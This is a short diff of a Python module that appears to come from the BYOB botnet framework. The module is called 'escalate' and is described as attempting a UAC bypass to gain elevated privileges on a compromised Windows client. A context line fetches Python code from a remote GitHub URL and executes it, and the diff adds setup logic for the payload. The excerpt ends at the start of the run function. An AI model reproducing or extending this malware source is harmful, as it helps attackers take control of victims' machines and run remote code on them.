@@ -15,14 +15,20 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-packages  = ['win32com.client']
+packages = ['win32com.client']
 platforms = ['win32']
-usage     = 'escalate'
-command   = True
+results = {}
+usage = 'escalate'
+description = """
+Attempt UAC bypass to escalate privileges in the current 
+context on the client host machine
+"""
 
 # setup
-util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
+if util.is_compatible(platforms, __name__):
+    util.imports(packages, globals())
+else:
+    sys.exit()
 
 # main
 def run(filename):
